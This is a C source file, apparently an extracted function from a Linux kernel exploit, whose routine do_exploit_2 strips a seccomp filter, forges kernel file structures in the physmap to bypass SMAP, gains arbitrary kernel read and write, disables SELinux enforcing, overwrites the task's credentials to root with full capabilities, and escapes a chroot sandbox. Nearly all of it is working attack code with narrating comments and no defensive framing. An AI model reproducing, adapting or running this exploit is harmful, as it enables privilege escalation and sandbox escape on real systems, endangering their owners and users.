#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct PagePair {unsigned long userland_page; int kernel_page; } ;
typedef  int /*<<< orphan*/  pthread_t ;
typedef  int /*<<< orphan*/  buf ;

/* Variables and functions */
 scalar_t__ CRED_CAP_OFF ; 
 int CRED_CAP_SIZE ; 
 int CRED_ID_SIZE ; 
 scalar_t__ CRED_NS_OFF ; 
 scalar_t__ CRED_UID_OFF ; 
 unsigned int FMODE_LSEEK ; 
 unsigned long INIT_FS ; 
 unsigned long INIT_USER_NS ; 
 unsigned long OFFSET_OF_CRED_SECURITY ; 
 unsigned long OFFSET_OF_FILES ; 
 unsigned long OFFSET_OF_FS ; 
 scalar_t__ OFFSET_OF_FS_COUNT ; 
 scalar_t__ OFFSET_OF_F_COUNT ; 
 scalar_t__ OFFSET_OF_F_INODE ; 
 scalar_t__ OFFSET_OF_F_SECURITY ; 
 scalar_t__ OFFSET_OF_IFLAGS ; 
 unsigned long OFFSET_OF_NSPROXY ; 
 scalar_t__ OFFSET_OF_NS_COUNT ; 
 unsigned long OFFSET_OF_PARENT ; 
 scalar_t__ OFFSET_OF_SECCOMP ; 
 scalar_t__ OFFSET_OF_SECCOMP_MODE ; 
 unsigned long OFFSET_OF_SIGNAL ; 
 unsigned long OFFSET_OF_TASK_CRED ; 
 scalar_t__ OFFSET_OF_TASK_USAGE ; 
 unsigned long OFFSET_OF_THREAD_GROUP ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  P_ALL ; 
 scalar_t__ SELINUX_ENFORCING_OFF ; 
 int /*<<< orphan*/  SYS_waitid ; 
 int /*<<< orphan*/  WEXITED ; 
 scalar_t__ done_overwrite ; 
 int done_rooting ; 
 int errno ; 
 int /*<<< orphan*/  exit (int) ; 
 unsigned long* f_op ; 
 int fork () ; 
 int /*<<< orphan*/  get_physmap (struct PagePair*) ; 
 unsigned long kernel_base ; 
 int /*<<< orphan*/  mem_write (scalar_t__,...) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int open (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  printf (char*) ; 
 scalar_t__ pthread_create (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,long*) ; 
 unsigned long read_addr (unsigned long) ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  syscall (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,scalar_t__,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  thread_to_be_root ; 
 int /*<<< orphan*/  usleep (int) ; 
 int /*<<< orphan*/  write_5_thread ; 
 int /*<<< orphan*/  write_addr (unsigned long,unsigned long) ; 
 int /*<<< orphan*/  write_addr4 (scalar_t__,int) ; 

void do_exploit_2(unsigned long task_addr) {
  // second part of the exploit
  // now that we don't have seccomp we can fork and use waitid to write up to 5 non-NULL bytes
  // I map a large section of memory and search for it in the physmap to find an address with 3 NULL bytes
  // The physmap allows us to control data from userland and bypass smap

  // sleep for a bit to make sure threads exit
  usleep(100000);

  // remove seccomp filter
  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP-4, WEXITED, NULL);  
  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP_MODE, WEXITED, NULL);
  // verify seccomp removed for child
  int pid = fork();
  int rand_fd = open("/dev/random", O_RDONLY); // this will fail due to chroot
  
  if (errno == 1) {
    printf("SECCOMP NOT ACTUALLY GONE!\n");
    exit(-1);
  }
  if (!pid) {
    exit(0);
  }
  
  printf("part 2 start\n");
  // First, get a physmap address in the kernel land
  struct PagePair pp;
  get_physmap(&pp);
  
  // now we have a physmap address that we know, we can create our fake files
  // we will set up fake files struct
  memset((void*)pp.userland_page, 0x41, 0x1000);
  unsigned long files_struct = pp.userland_page;
  *(int*)files_struct = 100; // count (make sure it's never freed)
  *(unsigned long*)(files_struct+32) = pp.kernel_page+0x100; // fdt
  
  // set up fdt
  unsigned long fdt = pp.userland_page+0x100;
  *(int*)fdt = 2; // num_files
  *(unsigned long*)(fdt+8) = pp.kernel_page+0x200; // fd[] 
  
  // set up fd[]
  unsigned long fdarr = pp.userland_page+0x200;
  *(unsigned long*)fdarr = pp.kernel_page+0x300; // fd[0]
  
  // set up file struct
  unsigned long file = pp.userland_page+0x300;
  *(unsigned long*)(file+40) = pp.kernel_page+0x400; // f_op
  *(unsigned int*)(file+68) = FMODE_LSEEK; // mode
  *(unsigned long*)(file+OFFSET_OF_F_COUNT)=100; // never free me

  f_op = (unsigned long*)(pp.userland_page+0x400); // f_op pointer

  // need to set up IS_PRIVATE(inode)) and file->cred = task->cred to pass checks for ioctl
  // this is the IS_PRIVATE(inode)
  *(unsigned long*)(file+OFFSET_OF_F_INODE)=pp.kernel_page+0x500; // inode
  unsigned long inode = (unsigned long)(pp.userland_page+0x500); // inode
  *(unsigned int*)(inode+OFFSET_OF_IFLAGS) = 0x200; // IS_PRIVATE
  
  // write over files pointer in task struct
  // will overwrite signal nsproxy and fs, so we will need to fix it
  printf("here we go\n");
  done_overwrite=0;
  long aa[2];
  aa[0] = task_addr + OFFSET_OF_FILES;
  aa[1] = pp.kernel_page;
  pthread_t th1;
  // create the thread we will make root
  done_rooting = 0;
  if(pthread_create(&th1, NULL, thread_to_be_root, NULL)) {
    printf("pthread failed\n");
    exit(-1);
  }
  
  // create a thread to overwrite the files in our task
  // this current thread can't do that because the signal will be corrupted
  if(pthread_create(&th1, NULL, write_5_thread, aa)) {
    printf("pthread failed\n");
    exit(-1);
  }

  // wait for the thread to overwrite my files
  while(!done_overwrite) {
  }
   
  // I'll use lseek here to do arbitrary reads

  // need to set up IS_PRIVATE(inode)) and file->security = task->cred->security to pass checks for ioctl  
  // first fix up structures in FILE
  // let's check another file
  // leak out addr of parent
  unsigned long parent_addr = read_addr(task_addr+OFFSET_OF_PARENT);
  
  // grab security from task cred
  unsigned long cred = read_addr(task_addr + OFFSET_OF_TASK_CRED);
  unsigned long security = read_addr(cred + OFFSET_OF_CRED_SECURITY);
  
  // fix up file->security
  *(unsigned long*)(file+OFFSET_OF_F_SECURITY) = security;

  // now have arb write through ioctl!
    
  // okay first fix up task struct
  // copy parent's nsproxy and set it's refcount high
  long parent_nsproxy = read_addr(parent_addr+OFFSET_OF_NSPROXY);
  write_addr(task_addr+OFFSET_OF_NSPROXY, parent_nsproxy);
  write_addr4(parent_nsproxy+OFFSET_OF_NS_COUNT, 0x11111111);
  
  // copy parent's fs and set it's refcount high
  long parent_fs = read_addr(parent_addr+OFFSET_OF_FS);
  write_addr(task_addr+OFFSET_OF_FS, parent_fs);
  write_addr4(parent_fs+OFFSET_OF_FS_COUNT, 0x11111111);
  
  // now set tasks refcount high, we don't want to free it ever either?
  write_addr4(task_addr+OFFSET_OF_TASK_USAGE, 0x11111);
  
  // GET ROOT
  // disable selinux enforcing
  write_addr4(kernel_base+SELINUX_ENFORCING_OFF, 0);
  
  unsigned long thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP)-OFFSET_OF_THREAD_GROUP;
  if (thread2 == task_addr) {
    thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP+8)-OFFSET_OF_THREAD_GROUP;
  }

  unsigned long signal = read_addr(thread2+OFFSET_OF_SIGNAL);
  write_addr(task_addr+OFFSET_OF_SIGNAL, signal);
  // should be able to ptrace now (it's a decent test to make sure signal is fixed
  
  // now fix up cred we want root
  char buf[100];
  memset(buf, 0, sizeof(buf));
  mem_write(cred+CRED_UID_OFF, buf, CRED_ID_SIZE);
  memset(buf, 0xff, sizeof(buf));
  mem_write(cred+CRED_CAP_OFF, buf, CRED_CAP_SIZE);
  unsigned long init_ns = INIT_USER_NS+kernel_base;
  mem_write(cred+CRED_NS_OFF, &init_ns, 8); // is this okay

  // now we need to just escape the file system sandbox (chroot)
  unsigned long init_fs = INIT_FS+kernel_base;
  write_addr(thread2+OFFSET_OF_FS, init_fs);
  // WE ARE DONE!
  // signal to the other thread and sleep forever
  done_rooting = 1;
  sleep(1000000);

}